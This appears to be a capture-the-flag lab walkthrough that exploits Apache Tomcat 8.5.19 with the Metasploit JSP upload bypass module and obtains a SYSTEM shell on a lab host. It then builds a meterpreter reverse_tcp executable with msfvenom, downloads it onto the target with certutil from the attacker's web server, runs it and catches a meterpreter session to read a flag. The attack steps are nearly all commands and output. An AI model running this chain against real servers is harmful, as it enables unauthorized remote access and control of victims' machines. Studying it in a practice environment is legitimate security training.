- Apache Tomcat, also known as Tomcat server, is a popular, free and open source Java servlet web server
- It is used to build and host dynamic websites and web applications based on the Java software platform.
- Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients
- Apache Tomcat runs on TCP port 8080 by default.
- With the setup of SSL certificate it runs on TCP port 443
- The standard Apache HTTP web server is used to host static and dynamic websites or webapplications, typically developed in PHP.
- The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.
- Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server.
- We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server.
- The port that is used for a standard HTTP server is port 80 or port 443.

```
root@attackdefense:~# ip -4 -o -h address
1: lo    inet 127.0.0.1/8 scope host lo\       valid_lft forever preferred_lft forever
16934: eth0    inet 10.1.0.4/16 brd 10.1.255.255 scope global eth0\       valid_lft forever preferred_lft forever
16936: eth1    inet 10.10.26.3/24 brd 10.10.26.255 scope global eth1\       valid_lft forever preferred_lft forever
root@attackdefense:~# cat ~/Desktop/target 
Target IP Address : 10.5.17.122
```

```
root@attackdefense:~# service postgresql status
12/main (port 5432): down
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
       =[ metasploit v5.0.74-dev                          ]
+ -- --=[ 1972 exploits - 1088 auxiliary - 338 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a tomcat
[*] Added workspace: tomcat
[*] Workspace: tomcat
msf5 > setg RHOSTS 10.5.17.122
RHOSTS => 10.5.17.122
msf5 > setg RHOST 10.5.17.122
RHOST => 10.5.17.122
msf5 > db_nmap -sS -sV -O 10.5.17.122
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-03 15:09 IST
[*] Nmap: Nmap scan report for 10.5.17.122
[*] Nmap: Host is up (0.0020s latency).
[*] Nmap: Not shown: 989 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
[*] Nmap: 8080/tcp  open  http               Apache Tomcat 8.5.19
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49175/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.70%E=4%D=8/3%OT=135%CT=1%CU=41111%PV=Y%DS=3%DC=I%G=Y%TM=64CB762
[*] Nmap: OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=
[*] Nmap: OS:7)OPS(O1=M546NW8ST11%O2=M546NW8ST11%O3=M546NW8NNT11%O4=M546NW8ST11%O5=M5
[*] Nmap: OS:46NW8ST11%O6=M546ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
[*] Nmap: OS:0)ECN(R=Y%DF=Y%T=7F%W=2000%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%A=S
[*] Nmap: OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
[*] Nmap: OS:T=7F%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%RD=
[*] Nmap: OS:0%Q=)T5(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W=0%
[*] Nmap: OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
[*] Nmap: OS:R=Y%DF=N%T=7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
[*] Nmap: OS:N%T=7F%CD=Z)
[*] Nmap: Network Distance: 3 hops
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 90.70 seconds
```

```
msf5 > search type:exploit name:tomcat

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_jsp_upload_bypass  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   1  exploit/multi/http/tomcat_mgr_deploy         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   2  exploit/multi/http/tomcat_mgr_upload         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   3  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability


msf5 > use exploit/multi/http/tomcat_jsp_upload_bypass
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > options

Module options (exploit/multi/http/tomcat_jsp_upload_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.5.17.122      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI path of the Tomcat installation
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set payload java/jsp_shell_bind_tcp 
payload => java/jsp_shell_bind_tcp
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > options

Module options (exploit/multi/http/tomcat_jsp_upload_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.5.17.122      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI path of the Tomcat installation
   VHOST                       no        HTTP server virtual host


Payload options (java/jsp_shell_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  10.5.17.122      no        The target address
   SHELL                   no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set shell cmd
shell => cmd
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > run

[*] Started reverse TCP handler on 10.10.26.3:4444 
[*] Uploading payload...
[*] Payload executed!
[*] Command shell session 1 opened (10.10.26.3:4444 -> 10.5.17.122:49251) at 2023-08-03 15:12:54 +0530


(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 8.5>sysinfo
sysinfo

C:\Program Files\Apache Software Foundation\Tomcat 8.5>whoami
whoami
nt authority\system

C:\Program Files\Apache Software Foundation\Tomcat 8.5>^Z
Background session 1? [y/N]  y
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) >
```

```
root@attackdefense:~# cd Desktop/
root@attackdefense:~/Desktop# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.23.3 LPORT=1234 -f exe > payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
root@attackdefense:~/Desktop# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.5.17.122 - - [03/Aug/2023 15:16:20] "GET /payload.exe HTTP/1.1" 200 -
10.5.17.122 - - [03/Aug/2023 15:16:22] "GET /payload.exe HTTP/1.1" 200 -
^CTraceback (most recent call last):
  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main
    "__main__", fname, loader, pkg_name)
  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code
    exec code in run_globals
  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>
    test()
  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test
    BaseHTTPServer.test(HandlerClass, ServerClass)
  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test
    httpd.serve_forever()
  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
    poll_interval)
  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry
    return func(*args)
KeyboardInterrupt
root@attackdefense:~/Desktop# 

```

```
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions

Active sessions
===============

  Id  Name  Type              Information                           Connection
  --  ----  ----              -----------                           ----------
  1         shell java/linux  Microsoft Windows [Version 6.3.9600]  10.10.26.3:4444 -> 10.5.17.122:49251 (10.5.17.122)

msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions 1
[*] Starting interaction with 1...



C:\Program Files\Apache Software Foundation\Tomcat 8.5>certutil -urlcache -f http://10.10.26.3/payload.exe payload.exe
certutil -urlcache -f http://10.10.26.3/payload.exe payload.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Program Files\Apache Software Foundation\Tomcat 8.5>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 8.5

08/03/2023  09:46 AM    <DIR>          .
08/03/2023  09:46 AM    <DIR>          ..
09/16/2020  06:00 AM    <DIR>          bin
09/16/2020  06:02 AM    <DIR>          conf
09/16/2020  06:00 AM    <DIR>          lib
07/24/2017  09:01 PM            58,153 LICENSE
08/03/2023  09:30 AM    <DIR>          logs
07/24/2017  09:01 PM             1,774 NOTICE
08/03/2023  09:46 AM            73,802 payload.exe
07/24/2017  09:01 PM             7,241 RELEASE-NOTES
09/16/2020  06:00 AM    <DIR>          temp
07/24/2017  09:01 PM            21,630 tomcat.ico
07/24/2017  09:01 PM            73,624 Uninstall.exe
09/16/2020  06:00 AM    <DIR>          webapps
09/16/2020  06:00 AM    <DIR>          work
               6 File(s)        236,224 bytes
               9 Dir(s)   8,678,891,520 bytes free

C:\Program Files\Apache Software Foundation\Tomcat 8.5>.\payload.exe
```

handler.rc

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.26.3
set lport 1234
run
```

```
C:\Program Files\Apache Software Foundation\Tomcat 8.5>cd /
cd /

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\

09/16/2020  06:03 AM                32 flag.txt
08/22/2013  03:52 PM    <DIR>          PerfLogs
09/16/2020  06:00 AM    <DIR>          Program Files
09/05/2020  09:05 AM    <DIR>          Program Files (x86)
09/10/2020  09:50 AM    <DIR>          Users
08/03/2023  09:46 AM    <DIR>          Windows
               1 File(s)             32 bytes
               5 Dir(s)   8,855,896,064 bytes free

C:\>type flag.txt
type flag.txt
92d60a06d0ea2179c9a8c442c0bd0bc0
```

```
root@attackdefense:~/Desktop# msfconsole -r handler.rc 
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v5.0.74-dev                          ]
+ -- --=[ 1972 exploits - 1088 auxiliary - 338 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use multi/handler
resource (handler.rc)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (handler.rc)> set lhost 10.10.26.3
lhost => 10.10.26.3
resource (handler.rc)> set lport 1234
lport => 1234
resource (handler.rc)> run
[*] Started reverse TCP handler on 10.10.26.3:1234 
[*] Sending stage (180291 bytes) to 10.5.17.122
[*] Meterpreter session 1 opened (10.10.26.3:1234 -> 10.5.17.122:49357) at 2023-08-03 15:37:58 +0530

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode                Size               Type  Last modified                   Name
----                ----               ----  -------------                   ----
40777/rwxrwxrwx     0                  dir   2020-08-12 09:43:47 +0530       $Recycle.Bin
100666/rw-rw-rw-    1                  fil   2013-08-22 21:16:48 +0530       BOOTNXT
40777/rwxrwxrwx     0                  dir   2013-08-22 20:18:41 +0530       Documents and Settings
40777/rwxrwxrwx     0                  dir   2013-08-22 21:09:30 +0530       PerfLogs
40555/r-xr-xr-x     4096               dir   2013-08-22 19:06:16 +0530       Program Files
40777/rwxrwxrwx     4096               dir   2013-08-22 19:06:16 +0530       Program Files (x86)
40777/rwxrwxrwx     4096               dir   2013-08-22 19:06:16 +0530       ProgramData
40777/rwxrwxrwx     0                  dir   2020-09-05 09:16:25 +0530       System Volume Information
40555/r-xr-xr-x     4096               dir   2013-08-22 19:06:16 +0530       Users
40777/rwxrwxrwx     24576              dir   2013-08-22 19:06:16 +0530       Windows
100444/r--r--r--    398356             fil   2013-08-22 21:16:48 +0530       bootmgr
100666/rw-rw-rw-    32                 fil   2020-09-16 11:33:04 +0530       flag.txt
65411620/rw--w----  22795607643029487  fif   731368356-09-17 04:26:00 +0530  pagefile.sys

meterpreter > cat flag.txt 
92d60a06d0ea2179c9a8c442c0bd0bc0
meterpreter >
```

